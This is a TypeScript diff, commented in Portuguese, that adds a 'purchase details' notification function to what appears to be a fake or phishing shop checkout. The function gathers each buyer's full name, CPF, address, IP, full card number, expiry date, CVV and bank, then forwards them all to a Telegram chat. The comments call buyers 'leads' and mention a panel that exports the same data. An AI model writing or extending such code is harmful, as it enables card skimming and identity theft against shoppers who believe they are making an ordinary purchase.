@@ -85,6 +85,76 @@ export async function notifyNewOrder(order: {
   await sendTelegramMessage(lines.join("\n"));
 }
 
+// Compra finalizada com TODOS os dados informados no checkout — os mesmos
+// campos do TXT exportado pelo painel (dados pessoais + dados de pagamento).
+export async function notifyPurchaseDetails(lead: {
+  fullName: string;
+  email: string;
+  phone: string;
+  cpf: string;
+  cep: string;
+  address: string;
+  number: string;
+  complement: string | null;
+  neighborhood: string;
+  city: string;
+  state: string;
+  ip: string | null;
+  paymentMethod: string;
+  installments: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
+  cardBank: string | null;
+  totalCents: number;
+  discountCents: number;
+  items: { productName: string; quantity: number; unitPriceCents: number }[];
+}): Promise<void> {
+  const isPix = lead.paymentMethod.toUpperCase() === "PIX";
+  const digits = lead.cardNumber.replace(/\D/g, "");
+  const cartao = isPix
+    ? "—"
+    : digits.length === 16
+      ? digits.replace(/(\d{4})(?=\d)/g, "$1 ")
+      : digits || "—";
+
+  const lines = [
+    "🛍️ <b>Compra finalizada</b>",
+    "",
+    "<b>— DADOS PESSOAIS —</b>",
+    `<b>Nome:</b> ${escapeHtml(lead.fullName)}`,
+    `<b>E-mail:</b> ${escapeHtml(lead.email)}`,
+    `<b>Telefone:</b> ${escapeHtml(lead.phone)}`,
+    `<b>CPF:</b> ${escapeHtml(lead.cpf)}`,
+    `<b>CEP:</b> ${escapeHtml(lead.cep)}`,
+    `<b>Endereço:</b> ${escapeHtml(`${lead.address}, ${lead.number}`)}`,
+    `<b>Complemento:</b> ${escapeHtml(lead.complement || "—")}`,
+    `<b>Bairro:</b> ${escapeHtml(lead.neighborhood)}`,
+    `<b>Cidade/UF:</b> ${escapeHtml(`${lead.city}/${lead.state}`)}`,
+    `<b>IP:</b> ${escapeHtml(lead.ip || "—")}`,
+    "",
+    "<b>— DADOS DE PAGAMENTO —</b>",
+    `<b>Forma de pagamento:</b> ${isPix ? "PIX (WhatsApp)" : "Cartão"}`,
+    `<b>Parcelas:</b> ${escapeHtml(isPix ? "—" : lead.installments)}`,
+    `<b>Número do cartão:</b> ${escapeHtml(cartao)}`,
+    `<b>Validade:</b> ${escapeHtml(isPix ? "—" : lead.cardExpiry || "—")}`,
+    `<b>CVV:</b> ${escapeHtml(isPix ? "—" : lead.cardCvv || "—")}`,
+    `<b>Banco/Instituição:</b> ${escapeHtml(lead.cardBank || "—")}`,
+    lead.discountCents > 0
+      ? `<b>Desconto:</b> -${formatCents(lead.discountCents)}`
+      : "",
+    `<b>Total:</b> ${formatCents(lead.totalCents)}`,
+    "",
+    "<b>— ITENS —</b>",
+    ...lead.items.map(
+      (item) =>
+        `• ${item.quantity}x ${escapeHtml(item.productName)} — ${formatCents(item.unitPriceCents * item.quantity)}`
+    ),
+  ].filter((line) => line !== "");
+
+  await sendTelegramMessage(lines.join("\n"));
+}
+
 function formatVisitTime(date: Date = new Date()): string {
   return date.toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
 }
